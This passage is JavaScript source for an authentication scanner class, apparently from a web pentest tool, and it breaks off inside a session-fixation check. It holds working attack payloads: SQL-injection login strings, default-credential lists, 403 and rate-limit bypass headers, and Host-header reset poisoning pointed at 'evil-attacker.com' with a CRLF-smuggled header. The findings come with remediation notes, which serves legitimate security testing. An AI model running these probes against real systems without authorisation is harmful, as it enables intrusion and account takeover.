import { httpGet, httpPost, httpRequest } from '../../../utils/http-client.js';
import { generateId, sleep, base64Encode, base64Decode } from '../../../utils/helpers.js';
import logger from '../../../utils/logger.js';

/**
 * Authentication & Authorization Scanner
 * Covers: Admin bypass, 403 bypass, Login bypass, Password reset abuse,
 * Account enumeration, Rate limit bypass, Session fixation, JWT attacks,
 * OTP bypass, Broken access control, Missing auth, IDOR
 */
export class AuthScanner {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.delay = options.delay || 100;
    this.findings = [];
  }

  /**
   * Run all authentication & authorization checks
   */
  async scan(url, options = {}) {
    const scanModules = [
      { name: 'Admin Bypass', fn: () => this.scanAdminBypass(url, options) },
      { name: '403 Forbidden Bypass', fn: () => this.scan403Bypass(url, options) },
      { name: 'Login Bypass', fn: () => this.scanLoginBypass(url, options) },
      { name: 'Password Reset Abuse', fn: () => this.scanPasswordResetAbuse(url, options) },
      { name: 'Account Enumeration', fn: () => this.scanAccountEnumeration(url, options) },
      { name: 'Rate Limit Bypass', fn: () => this.scanRateLimitBypass(url, options) },
      { name: 'Session Fixation', fn: () => this.scanSessionFixation(url, options) },
      { name: 'JWT Attacks', fn: () => this.scanJWTAttacks(url, options) },
      { name: 'OTP Bypass', fn: () => this.scanOTPBypass(url, options) },
      { name: 'Broken Access Control', fn: () => this.scanBrokenAccessControl(url, options) },
      { name: 'Missing Authentication', fn: () => this.scanMissingAuth(url, options) },
      { name: 'IDOR', fn: () => this.scanIDOR(url, options) },
    ];

    for (const mod of scanModules) {
      try {
        logger.info(`  [${mod.name}] Scanning...`);
        const results = await mod.fn();
        if (results && results.length > 0) {
          this.findings.push(...results);
          results.forEach(r => logger.vuln?.(r.severity, `    FOUND: ${r.title}`) || logger.info(`    FOUND [${r.severity}]: ${r.title}`));
        }
      } catch (e) {
        logger.debug?.(`  [${mod.name}] Error: ${e.message}`) || logger.info(`  [${mod.name}] Error: ${e.message}`);
      }
    }

    return this.findings;
  }

  // ═══════════════════════════════════════════════════════════
  // ADMIN BYPASS
  // ═══════════════════════════════════════════════════════════
  async scanAdminBypass(url, options = {}) {
    const findings = [];
    const adminPaths = options.adminPaths || ['/admin', '/admin/', '/dashboard', '/panel', '/management'];
    const baseUrl = this._getBaseUrl(url);

    for (const adminPath of adminPaths) {
      const targetUrl = `${baseUrl}${adminPath}`;

      // Get baseline (should be 401/403/302)
      const baseline = await httpGet(targetUrl, { timeout: this.timeout });
      if (baseline.status === 200) continue; // Already accessible, skip

      // Path manipulation bypasses
      const pathBypasses = [
        { path: `${adminPath}/`, desc: 'Trailing slash' },
        { path: `${adminPath}//`, desc: 'Double slash' },
        { path: `${adminPath}/.`, desc: 'Dot segment' },
        { path: `${adminPath}/..;/`, desc: 'Semicolon path traversal' },
        { path: `${adminPath}%20`, desc: 'URL-encoded space' },
        { path: `${adminPath}%09`, desc: 'URL-encoded tab' },
        { path: `${adminPath}%00`, desc: 'Null byte' },
        { path: `${adminPath}..;/`, desc: 'Path traversal with semicolon' },
        { path: `/${adminPath.slice(1).toUpperCase()}`, desc: 'Case variation (upper)' },
        { path: `${adminPath}?`, desc: 'Trailing question mark' },
        { path: `${adminPath}#`, desc: 'Trailing hash' },
        { path: `${adminPath}.json`, desc: 'JSON extension' },
        { path: `${adminPath}.html`, desc: 'HTML extension' },
        { path: `${adminPath};.css`, desc: 'Semicolon CSS extension' },
      ];

      for (const bypass of pathBypasses) {
        const testUrl = `${baseUrl}${bypass.path}`;
        const resp = await httpGet(testUrl, { timeout: this.timeout });

        if (resp.status === 200 && baseline.status !== 200) {
          const body = typeof resp.data === 'string' ? resp.data : '';
          if (body.length > 100) {
            findings.push(this._createFinding({
              type: 'admin-bypass-path', title: `Admin Bypass via Path Manipulation: ${bypass.desc}`,
              severity: 'critical', url: testUrl, parameter: 'URL Path',
              payload: bypass.path,
              evidence: `Path "${bypass.path}" returns 200 while "${adminPath}" returns ${baseline.status}`,
              request: `GET ${testUrl}`,
              response: `HTTP 200 (${body.length} bytes) - Admin content accessible via ${bypass.desc}`,
              remediation: 'Normalize URL paths before authorization checks. Use middleware-level access control.',
              cwe: 'CWE-287', owasp: 'A01:2021 Broken Access Control',
            }));
            break;
          }
        }
      }

      // Header injection bypasses
      const headerBypasses = [
        { headers: { 'X-Original-URL': adminPath }, desc: 'X-Original-URL' },
        { headers: { 'X-Rewrite-URL': adminPath }, desc: 'X-Rewrite-URL' },
        { headers: { 'X-Custom-IP-Authorization': '127.0.0.1' }, desc: 'X-Custom-IP-Authorization' },
        { headers: { 'X-Forwarded-For': '127.0.0.1' }, desc: 'X-Forwarded-For: 127.0.0.1' },
        { headers: { 'X-Forwarded-For': '::1' }, desc: 'X-Forwarded-For: ::1' },
        { headers: { 'X-Real-IP': '127.0.0.1' }, desc: 'X-Real-IP: 127.0.0.1' },
        { headers: { 'X-Originating-IP': '127.0.0.1' }, desc: 'X-Originating-IP' },
        { headers: { 'X-Remote-IP': '127.0.0.1' }, desc: 'X-Remote-IP' },
        { headers: { 'X-Client-IP': '127.0.0.1' }, desc: 'X-Client-IP' },
        { headers: { 'X-Host': '127.0.0.1' }, desc: 'X-Host' },
        { headers: { 'X-Forwarded-Host': 'localhost' }, desc: 'X-Forwarded-Host: localhost' },
        { headers: { 'X-ProxyUser-Ip': '127.0.0.1' }, desc: 'X-ProxyUser-Ip' },
        { headers: { 'Referer': `${baseUrl}${adminPath}` }, desc: 'Referer spoofing' },
      ];

      for (const hb of headerBypasses) {
        const resp = await httpGet(targetUrl, {
          timeout: this.timeout,
          headers: hb.headers,
        });

        if (resp.status === 200 && baseline.status !== 200) {
          const body = typeof resp.data === 'string' ? resp.data : '';
          if (body.length > 100) {
            findings.push(this._createFinding({
              type: 'admin-bypass-header', title: `Admin Bypass via Header Injection: ${hb.desc}`,
              severity: 'critical', url: targetUrl, parameter: Object.keys(hb.headers)[0],
              payload: JSON.stringify(hb.headers),
              evidence: `Header "${hb.desc}" bypasses access control (${baseline.status} -> 200)`,
              request: `GET ${targetUrl}\n${Object.entries(hb.headers).map(([k, v]) => `${k}: ${v}`).join('\n')}`,
              response: `HTTP 200 - Access granted with injected header`,
              remediation: 'Do not trust client-supplied headers for authorization. Implement server-side access control.',
              cwe: 'CWE-287', owasp: 'A01:2021 Broken Access Control',
            }));
            break;
          }
        }
      }

      // HTTP method tampering
      const methods = ['POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'];
      for (const method of methods) {
        const resp = await httpRequest(method, targetUrl, { timeout: this.timeout });

        if (resp.status === 200 && baseline.status !== 200) {
          findings.push(this._createFinding({
            type: 'admin-bypass-method', title: `Admin Bypass via HTTP Method Tampering: ${method}`,
            severity: 'high', url: targetUrl, parameter: 'HTTP Method',
            payload: method,
            evidence: `${method} request returns 200 while GET returns ${baseline.status}`,
            request: `${method} ${targetUrl}`,
            response: `HTTP 200 - Access granted via ${method} method`,
            remediation: 'Apply access control consistently across all HTTP methods.',
            cwe: 'CWE-287', owasp: 'A01:2021 Broken Access Control',
          }));
          break;
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // 403 FORBIDDEN BYPASS
  // ═══════════════════════════════════════════════════════════
  async scan403Bypass(url, options = {}) {
    const findings = [];
    const targetPaths = options.forbiddenPaths || ['/admin', '/internal', '/private', '/api/admin', '/config'];
    const baseUrl = this._getBaseUrl(url);

    for (const path of targetPaths) {
      const targetUrl = `${baseUrl}${path}`;
      const baseline = await httpGet(targetUrl, { timeout: this.timeout });

      if (baseline.status !== 403) continue; // Only test 403 responses

      // All 403 bypass techniques
      const bypasses = [
        // URL encoding variations
        { url: `${baseUrl}${path}%2e`, desc: 'URL-encoded dot' },
        { url: `${baseUrl}/${path.slice(1)}%00`, desc: 'Null byte injection' },
        { url: `${baseUrl}/${path.slice(1)}%0d%0a`, desc: 'CRLF injection' },
        { url: `${baseUrl}/${path.slice(1)}%23`, desc: 'URL-encoded hash' },
        { url: `${baseUrl}/${path.slice(1)}%3f`, desc: 'URL-encoded question mark' },

        // Path manipulation
        { url: `${baseUrl}/${path.slice(1)}/`, desc: 'Trailing slash' },
        { url: `${baseUrl}//${path.slice(1)}`, desc: 'Double slash prefix' },
        { url: `${baseUrl}/./${path.slice(1)}`, desc: 'Dot slash prefix' },
        { url: `${baseUrl}/${path.slice(1)}/.`, desc: 'Trailing dot' },
        { url: `${baseUrl}/${path.slice(1)}/./`, desc: 'Trailing dot-slash' },
        { url: `${baseUrl}/${path.slice(1)}..;/`, desc: 'Semicolon traversal' },
        { url: `${baseUrl}/;/${path.slice(1)}`, desc: 'Semicolon prefix' },
        { url: `${baseUrl}/.;/${path.slice(1)}`, desc: 'Dot-semicolon prefix' },
        { url: `${baseUrl}/${path.slice(1)}...;/`, desc: 'Triple dot semicolon' },

        // Case manipulation
        { url: `${baseUrl}/${path.slice(1).split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c).join('')}`, desc: 'Mixed case' },

        // HTTP version
        { url: targetUrl, desc: 'HTTP/1.0', httpVersion: '1.0' },

        // Wildcard/glob
        { url: `${baseUrl}/${path.slice(1)}*`, desc: 'Wildcard suffix' },
        { url: `${baseUrl}/${path.slice(1)}?anything`, desc: 'Query string' },
      ];

      for (const bypass of bypasses) {
        const resp = await httpGet(bypass.url, { timeout: this.timeout });

        if (resp.status === 200) {
          const body = typeof resp.data === 'string' ? resp.data : '';
          if (body.length > 50) {
            findings.push(this._createFinding({
              type: '403-bypass', title: `403 Bypass: ${bypass.desc} on ${path}`,
              severity: 'high', url: bypass.url, parameter: 'URL/Path',
              payload: bypass.url.replace(baseUrl, ''),
              evidence: `403 Forbidden bypassed using ${bypass.desc} technique`,
              request: `GET ${bypass.url}`,
              response: `HTTP 200 (${body.length} bytes) - Previously forbidden content accessible`,
              remediation: 'Normalize URLs before access control checks. Use framework-level authorization.',
              cwe: 'CWE-863', owasp: 'A01:2021 Broken Access Control',
            }));
            break;
          }
        }
      }

      // Header-based 403 bypass
      const headerBypasses = [
        { 'X-Forwarded-For': '127.0.0.1' },
        { 'X-Forwarded-For': '10.0.0.1' },
        { 'X-Forwarded-For': '172.16.0.1' },
        { 'X-Forwarded-For': '192.168.1.1' },
        { 'X-Real-IP': '127.0.0.1' },
        { 'X-Originating-IP': '127.0.0.1' },
        { 'X-Custom-IP-Authorization': '127.0.0.1' },
        { 'X-Original-URL': path },
        { 'X-Rewrite-URL': path },
        { 'Content-Length': '0' },
      ];

      for (const headers of headerBypasses) {
        const resp = await httpGet(targetUrl, { timeout: this.timeout, headers });

        if (resp.status === 200) {
          const headerName = Object.keys(headers)[0];
          findings.push(this._createFinding({
            type: '403-bypass-header', title: `403 Bypass via ${headerName} on ${path}`,
            severity: 'high', url: targetUrl, parameter: headerName,
            payload: `${headerName}: ${headers[headerName]}`,
            evidence: `403 bypassed with header ${headerName}: ${headers[headerName]}`,
            request: `GET ${targetUrl}\n${headerName}: ${headers[headerName]}`,
            response: `HTTP 200 - Forbidden content accessible via header injection`,
            remediation: 'Do not use client headers for access decisions. Implement proper server-side authorization.',
            cwe: 'CWE-863', owasp: 'A01:2021 Broken Access Control',
          }));
          break;
        }
      }

      await sleep(this.delay);
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // LOGIN BYPASS
  // ═══════════════════════════════════════════════════════════
  async scanLoginBypass(url, options = {}) {
    const findings = [];
    const loginPaths = options.loginPaths || ['/login', '/admin/login', '/signin', '/auth/login'];
    const baseUrl = this._getBaseUrl(url);

    for (const loginPath of loginPaths) {
      const loginUrl = `${baseUrl}${loginPath}`;
      const pageResp = await httpGet(loginUrl, { timeout: this.timeout });
      const pageBody = typeof pageResp.data === 'string' ? pageResp.data.toLowerCase() : '';

      if (pageResp.status !== 200 || !pageBody.includes('password')) continue;

      // Detect form fields
      const usernameField = pageBody.match(/name=["'](user|username|email|login)["']/i)?.[1] || 'username';
      const passwordField = pageBody.match(/name=["'](pass|password|passwd|pwd)["']/i)?.[1] || 'password';

      // SQL injection in login
      const sqliPayloads = [
        { user: "' OR '1'='1' --", pass: 'anything', desc: 'OR bypass (single quote)' },
        { user: "' OR '1'='1' #", pass: 'anything', desc: 'OR bypass (hash comment)' },
        { user: "admin'--", pass: 'anything', desc: 'Comment after admin' },
        { user: "' OR 1=1 LIMIT 1--", pass: 'anything', desc: 'OR with LIMIT' },
        { user: "admin' OR '1'='1", pass: "admin' OR '1'='1", desc: 'Both fields injection' },
        { user: "') OR ('1'='1", pass: 'anything', desc: 'Parenthesis bypass' },
        { user: "admin'/*", pass: "*/--", desc: 'Comment injection' },
      ];

      for (const payload of sqliPayloads) {
        const postData = `${usernameField}=${encodeURIComponent(payload.user)}&${passwordField}=${encodeURIComponent(payload.pass)}`;
        const resp = await httpPost(loginUrl, postData, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
        });

        const respBody = typeof resp.data === 'string' ? resp.data.toLowerCase() : '';
        const respHeaders = resp.headers || {};

        const isSuccess = (resp.status === 302 && respHeaders['location'] && !respHeaders['location'].includes('login')) ||
                         (resp.status === 200 && (respBody.includes('dashboard') || respBody.includes('welcome') || respBody.includes('logout'))) ||
                         (respHeaders['set-cookie'] && /sess|auth|token/i.test(respHeaders['set-cookie'].toString()) &&
                          !respBody.includes('invalid') && !respBody.includes('error'));

        if (isSuccess) {
          findings.push(this._createFinding({
            type: 'login-bypass-sqli', title: `Login Bypass via SQL Injection: ${payload.desc}`,
            severity: 'critical', url: loginUrl, parameter: usernameField,
            payload: payload.user,
            evidence: `Authentication bypassed with SQL injection: ${payload.desc}`,
            request: `POST ${loginUrl}\n${usernameField}=${payload.user}&${passwordField}=***`,
            response: `HTTP ${resp.status}${respHeaders['location'] ? ' -> ' + respHeaders['location'] : ''} - Login successful`,
            remediation: 'Use parameterized queries. Never concatenate user input into SQL. Implement WAF.',
            cwe: 'CWE-89', owasp: 'A03:2021 Injection',
          }));
          break;
        }

        await sleep(this.delay);
      }

      // Default credentials check
      const defaultCreds = [
        { user: 'admin', pass: 'admin' },
        { user: 'admin', pass: 'password' },
        { user: 'admin', pass: '123456' },
        { user: 'root', pass: 'root' },
        { user: 'test', pass: 'test' },
        { user: 'admin', pass: '' },
      ];

      for (const cred of defaultCreds) {
        const postData = `${usernameField}=${encodeURIComponent(cred.user)}&${passwordField}=${encodeURIComponent(cred.pass)}`;
        const resp = await httpPost(loginUrl, postData, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
        });

        const respBody = typeof resp.data === 'string' ? resp.data.toLowerCase() : '';
        const respHeaders = resp.headers || {};

        const isSuccess = (resp.status === 302 && respHeaders['location'] && !respHeaders['location'].includes('login')) ||
                         (respBody.includes('dashboard') || respBody.includes('welcome') || respBody.includes('logout'));

        if (isSuccess) {
          findings.push(this._createFinding({
            type: 'login-bypass-default-creds', title: `Login with Default Credentials: ${cred.user}:${cred.pass}`,
            severity: 'critical', url: loginUrl, parameter: `${usernameField}/${passwordField}`,
            payload: `${cred.user}:${cred.pass}`,
            evidence: `Default credentials ${cred.user}:${cred.pass} accepted`,
            request: `POST ${loginUrl}\n${usernameField}=${cred.user}&${passwordField}=***`,
            response: `HTTP ${resp.status} - Authentication successful with default credentials`,
            remediation: 'Change all default credentials. Enforce strong password policy. Implement account lockout.',
            cwe: 'CWE-798', owasp: 'A07:2021 Identification and Authentication Failures',
          }));
          break;
        }

        await sleep(this.delay);
      }

      // Parameter manipulation (removing password field, adding admin=true)
      const manipulations = [
        { data: `${usernameField}=admin`, desc: 'Missing password field' },
        { data: `${usernameField}=admin&${passwordField}=&admin=true`, desc: 'Admin parameter injection' },
        { data: `${usernameField}=admin&${passwordField}=&role=admin`, desc: 'Role parameter injection' },
        { data: `${usernameField}=admin&${passwordField}=&verified=true`, desc: 'Verified parameter injection' },
      ];

      for (const manip of manipulations) {
        const resp = await httpPost(loginUrl, manip.data, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
        });

        const respBody = typeof resp.data === 'string' ? resp.data.toLowerCase() : '';
        const respHeaders = resp.headers || {};

        if (resp.status === 302 && respHeaders['location'] && !respHeaders['location'].includes('login')) {
          findings.push(this._createFinding({
            type: 'login-bypass-param', title: `Login Bypass via Parameter Manipulation: ${manip.desc}`,
            severity: 'critical', url: loginUrl, parameter: 'POST body',
            payload: manip.data,
            evidence: `Authentication bypassed with: ${manip.desc}`,
            request: `POST ${loginUrl}\n${manip.data}`,
            response: `HTTP ${resp.status} -> ${respHeaders['location']}`,
            remediation: 'Validate all required fields server-side. Ignore unexpected parameters.',
            cwe: 'CWE-287', owasp: 'A07:2021 Identification and Authentication Failures',
          }));
          break;
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // PASSWORD RESET ABUSE
  // ═══════════════════════════════════════════════════════════
  async scanPasswordResetAbuse(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);
    const resetPaths = ['/forgot-password', '/password/reset', '/reset-password', '/forgot', '/account/recover'];

    for (const resetPath of resetPaths) {
      const resetUrl = `${baseUrl}${resetPath}`;
      const pageResp = await httpGet(resetUrl, { timeout: this.timeout });

      if (pageResp.status !== 200) continue;
      const pageBody = typeof pageResp.data === 'string' ? pageResp.data.toLowerCase() : '';
      if (!pageBody.includes('email') && !pageBody.includes('reset')) continue;

      const emailField = pageBody.match(/name=["'](email|user|username)["']/i)?.[1] || 'email';

      // Host header poisoning for password reset
      const hostPayloads = [
        { header: 'Host', value: 'evil-attacker.com', desc: 'Host header override' },
        { header: 'X-Forwarded-Host', value: 'evil-attacker.com', desc: 'X-Forwarded-Host injection' },
        { header: 'X-Host', value: 'evil-attacker.com', desc: 'X-Host injection' },
        { header: 'Host', value: `${new URL(baseUrl).host}\r\nX-Forwarded-Host: evil.com`, desc: 'Host header CRLF' },
      ];

      for (const hp of hostPayloads) {
        const postData = `${emailField}=test@example.com`;
        const resp = await httpPost(resetUrl, postData, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
          headers: { [hp.header]: hp.value },
        });

        const respBody = typeof resp.data === 'string' ? resp.data.toLowerCase() : '';

        // Check if the response indicates success (email sent)
        if (resp.status === 200 || resp.status === 302) {
          if (respBody.includes('sent') || respBody.includes('check your email') || respBody.includes('success') || resp.status === 302) {
            findings.push(this._createFinding({
              type: 'password-reset-poisoning', title: `Password Reset Host Header Poisoning: ${hp.desc}`,
              severity: 'high', url: resetUrl, parameter: hp.header,
              payload: `${hp.header}: ${hp.value}`,
              evidence: `Password reset accepted with manipulated ${hp.desc}. Reset link may point to attacker domain.`,
              request: `POST ${resetUrl}\n${hp.header}: ${hp.value}\n\n${postData}`,
              response: `HTTP ${resp.status} - Reset email likely sent with poisoned link`,
              remediation: 'Use server-configured hostname for reset links. Ignore Host/X-Forwarded-Host for URL generation.',
              cwe: 'CWE-640', owasp: 'A07:2021 Identification and Authentication Failures',
            }));
            break;
          }
        }
      }

      // Token prediction test - request multiple resets and check for patterns
      const tokens = [];
      for (let i = 0; i < 3; i++) {
        const resp = await httpPost(resetUrl, `${emailField}=test${i}@example.com`, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
        });
        const respBody = typeof resp.data === 'string' ? resp.data : '';
        const tokenMatch = respBody.match(/token=([a-f0-9]+)/i) || respBody.match(/reset\/([a-f0-9]+)/i);
        if (tokenMatch) tokens.push(tokenMatch[1]);
        await sleep(200);
      }

      if (tokens.length >= 2) {
        // Check if tokens are sequential or predictable
        const isSequential = tokens.every((t, i) => i === 0 || Math.abs(parseInt(t, 16) - parseInt(tokens[i - 1], 16)) < 1000);
        const isShort = tokens.some(t => t.length < 16);

        if (isSequential || isShort) {
          findings.push(this._createFinding({
            type: 'password-reset-weak-token', title: `Predictable Password Reset Token${isShort ? ' (Too Short)' : ' (Sequential)'}`,
            severity: 'high', url: resetUrl, parameter: 'Reset Token',
            payload: tokens.join(', '),
            evidence: `Reset tokens appear ${isSequential ? 'sequential' : 'too short'}: ${tokens.slice(0, 2).join(', ')}`,
            request: `Multiple POST ${resetUrl}`,
            response: `Tokens: ${tokens.join(', ')}`,
            remediation: 'Use cryptographically secure random tokens (128+ bits). Add expiration. Single-use tokens.',
            cwe: 'CWE-640', owasp: 'A07:2021 Identification and Authentication Failures',
          }));
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // ACCOUNT ENUMERATION
  // ═══════════════════════════════════════════════════════════
  async scanAccountEnumeration(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);
    const loginPaths = ['/login', '/signin', '/auth/login', '/api/login', '/api/auth'];

    for (const loginPath of loginPaths) {
      const loginUrl = `${baseUrl}${loginPath}`;
      const pageResp = await httpGet(loginUrl, { timeout: this.timeout });
      if (pageResp.status !== 200) continue;

      const pageBody = typeof pageResp.data === 'string' ? pageResp.data.toLowerCase() : '';
      const usernameField = pageBody.match(/name=["'](user|username|email|login)["']/i)?.[1] || 'username';
      const passwordField = pageBody.match(/name=["'](pass|password|passwd|pwd)["']/i)?.[1] || 'password';

      // Test with likely valid and invalid usernames
      const validUser = 'admin';
      const invalidUser = `nonexistent_user_${Date.now()}`;

      const validResp = await httpPost(loginUrl, `${usernameField}=${validUser}&${passwordField}=wrongpassword123`, {
        timeout: this.timeout,
        contentType: 'application/x-www-form-urlencoded',
      });

      const invalidResp = await httpPost(loginUrl, `${usernameField}=${invalidUser}&${passwordField}=wrongpassword123`, {
        timeout: this.timeout,
        contentType: 'application/x-www-form-urlencoded',
      });

      const validBody = typeof validResp.data === 'string' ? validResp.data : '';
      const invalidBody = typeof invalidResp.data === 'string' ? invalidResp.data : '';

      // Check for different responses
      const differentStatus = validResp.status !== invalidResp.status;
      const differentLength = Math.abs(validBody.length - invalidBody.length) > 20;
      const differentContent = validBody.toLowerCase() !== invalidBody.toLowerCase();

      // Check for specific enumeration indicators
      const validHasUserMsg = /user.*not|account.*not|no.*user|unknown.*user/i.test(invalidBody) &&
                             !/user.*not|account.*not|no.*user|unknown.*user/i.test(validBody);
      const validHasPassMsg = /password.*incorrect|wrong.*password|invalid.*password/i.test(validBody) &&
                             !/password.*incorrect|wrong.*password|invalid.*password/i.test(invalidBody);

      if (differentStatus || validHasUserMsg || validHasPassMsg) {
        findings.push(this._createFinding({
          type: 'account-enumeration', title: `Account Enumeration via ${loginPath}`,
          severity: 'medium', url: loginUrl, parameter: usernameField,
          payload: `Valid: "${validUser}" vs Invalid: "${invalidUser}"`,
          evidence: differentStatus
            ? `Different status codes: valid user=${validResp.status}, invalid user=${invalidResp.status}`
            : `Different error messages for valid vs invalid usernames`,
          request: `POST ${loginUrl}\n${usernameField}=[valid/invalid]&${passwordField}=wrong`,
          response: `Valid user: HTTP ${validResp.status} (${validBody.length}b) | Invalid: HTTP ${invalidResp.status} (${invalidBody.length}b)`,
          remediation: 'Use generic error messages ("Invalid credentials"). Ensure consistent response times and sizes.',
          cwe: 'CWE-204', owasp: 'A07:2021 Identification and Authentication Failures',
        }));
      }

      // Timing-based enumeration
      const timingResults = [];
      for (const user of [validUser, invalidUser, validUser, invalidUser]) {
        const start = Date.now();
        await httpPost(loginUrl, `${usernameField}=${user}&${passwordField}=wrongpassword`, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
        });
        timingResults.push({ user, time: Date.now() - start });
        await sleep(100);
      }

      const validTimes = timingResults.filter(r => r.user === validUser).map(r => r.time);
      const invalidTimes = timingResults.filter(r => r.user === invalidUser).map(r => r.time);
      const avgValid = validTimes.reduce((a, b) => a + b, 0) / validTimes.length;
      const avgInvalid = invalidTimes.reduce((a, b) => a + b, 0) / invalidTimes.length;

      if (Math.abs(avgValid - avgInvalid) > 200) {
        findings.push(this._createFinding({
          type: 'account-enumeration-timing', title: `Timing-Based Account Enumeration at ${loginPath}`,
          severity: 'low', url: loginUrl, parameter: usernameField,
          payload: `Timing difference: ${Math.round(Math.abs(avgValid - avgInvalid))}ms`,
          evidence: `Valid user avg: ${Math.round(avgValid)}ms, Invalid user avg: ${Math.round(avgInvalid)}ms (diff: ${Math.round(Math.abs(avgValid - avgInvalid))}ms)`,
          request: `POST ${loginUrl} - Timing analysis`,
          response: `Response time varies by ~${Math.round(Math.abs(avgValid - avgInvalid))}ms based on username validity`,
          remediation: 'Ensure constant-time comparison. Add artificial delay to normalize response times.',
          cwe: 'CWE-208', owasp: 'A07:2021 Identification and Authentication Failures',
        }));
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // RATE LIMIT BYPASS
  // ═══════════════════════════════════════════════════════════
  async scanRateLimitBypass(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);
    const loginUrl = options.loginUrl || `${baseUrl}/login`;

    // First, check if rate limiting exists
    const requests = [];
    for (let i = 0; i < 20; i++) {
      requests.push(httpPost(loginUrl, 'username=admin&password=wrong' + i, {
        timeout: this.timeout,
        contentType: 'application/x-www-form-urlencoded',
      }));
    }

    const results = await Promise.allSettled(requests);
    const responses = results.filter(r => r.status === 'fulfilled').map(r => r.value);
    const rateLimited = responses.filter(r => r.status === 429);

    if (rateLimited.length === 0) {
      findings.push(this._createFinding({
        type: 'no-rate-limit', title: 'No Rate Limiting on Login Endpoint',
        severity: 'high', url: loginUrl, parameter: 'Login attempts',
        payload: '20 rapid login attempts',
        evidence: `20 consecutive login attempts accepted without rate limiting (no 429 responses)`,
        request: `20x POST ${loginUrl}\nusername=admin&password=wrong[1-20]`,
        response: `All returned HTTP ${responses[0]?.status || 'N/A'} - No rate limiting detected`,
        remediation: 'Implement rate limiting (e.g., 5 attempts per minute). Use progressive delays. Implement CAPTCHA.',
        cwe: 'CWE-307', owasp: 'A07:2021 Identification and Authentication Failures',
      }));
      return findings;
    }

    // Rate limiting exists - try bypass techniques
    const bypassTechniques = [
      { headers: { 'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }, desc: 'Random X-Forwarded-For' },
      { headers: { 'X-Real-IP': '1.2.3.4' }, desc: 'X-Real-IP spoofing' },
      { headers: { 'X-Originating-IP': '1.2.3.4' }, desc: 'X-Originating-IP' },
      { headers: { 'X-Client-IP': '1.2.3.4' }, desc: 'X-Client-IP' },
      { headers: { 'X-Remote-Addr': '1.2.3.4' }, desc: 'X-Remote-Addr' },
    ];

    for (const technique of bypassTechniques) {
      const bypassRequests = [];
      for (let i = 0; i < 10; i++) {
        const headers = { ...technique.headers };
        if (technique.desc.includes('Random')) {
          headers['X-Forwarded-For'] = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }
        bypassRequests.push(httpPost(loginUrl, `username=admin&password=wrong${i}`, {
          timeout: this.timeout,
          contentType: 'application/x-www-form-urlencoded',
          headers,
        }));
      }

      const bypassResults = await Promise.allSettled(bypassRequests);
      const bypassResponses = bypassResults.filter(r => r.status === 'fulfilled').map(r => r.value);
      const bypassRateLimited = bypassResponses.filter(r => r.status === 429);

      if (bypassRateLimited.length === 0 && bypassResponses.length > 5) {
        findings.push(this._createFinding({
          type: 'rate-limit-bypass', title: `Rate Limit Bypass via ${technique.desc}`,
          severity: 'high', url: loginUrl, parameter: Object.keys(technique.headers)[0],
          payload: JSON.stringify(technique.headers),
          evidence: `Rate limiting bypassed using ${technique.desc} - 10 requests accepted without throttling`,
          request: `POST ${loginUrl}\n${Object.entries(technique.headers).map(([k, v]) => `${k}: ${v}`).join('\n')}`,
          response: `All 10 requests returned non-429 status - rate limit bypassed`,
          remediation: 'Do not trust client IP headers for rate limiting. Use session-based or account-based limiting.',
          cwe: 'CWE-307', owasp: 'A07:2021 Identification and Authentication Failures',
        }));
        break;
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // SESSION FIXATION
  // ═══════════════════════════════════════════════════════════
  async scanSessionFixation(url, options = {}) {
    const findings = [];
    const baseUrl = this._getBaseUrl(url);

    // Get initial session
    const resp1 = await httpGet(url, { timeout: this.timeout });
    const setCookie1 = resp1.headers?.['set-cookie'];
    if (!setCookie1) return findings;

    const cookies1 = Array.isArray(setCookie1) ? setCookie1 : [setCookie1];
    const sessionCookie = cookies1.find(c => /sess|sid|session|phpsessid|jsessionid|asp\.net_sessionid/i.test(c));
    if (!sessionCookie) return findings;

    const cookieName = sessionCookie.split('=')[0].trim();
    const cookieValue = sessionCookie.split('=')[1]?.split(';')[0]?.trim();

    if (!cookieValue) return findings;

    // Try to use a fixed session ID
    const fixedSessionId = 'fixated_session_' + Date.now();
    const resp2 = await httpGet(url, {
      timeout: this.timeout,
      headers: { 'Cookie': `${cookieName}=${fixedSessionId}` },
    });

    const setCookie2 = resp2.headers?.['set-cookie'];
    if (!setCookie2) {
      // Server accepted our fixed session without issuing a new one
      findings.push(this._createFinding({
        type: 'session-fixation', title: 'Session Fixation: Server Accepts Arbitrary Session IDs',
        severity: 'high', url, parameter: `Cookie: ${cookieName}`,
        payload: `${cookieName}=${fixedSessionId}`,
        evidence: `Server accepted arbitrary session ID "${fixedSessionId}" without regenerating`,
        request: `GET ${url}\nCookie: ${cookieName}=${fixedSessionId}`,
        response: `HTTP ${resp2.status} - No new Set-Cookie header (session accepted as-is)`,
        remediation: 'Regenerate session ID after authentication. Reject unknown session IDs.',
        cwe: 'CWE-384', owasp: 'A07:2021 Identification and Authentication Failures',
      }));
    }

    // Check if session ID changes after login (if login endpoint available)
    const loginPaths = ['/login', '/signin', '/auth/login'];
    for (const loginPath of loginPaths) {
      const loginUrl = `${baseUrl}${loginPath}`;
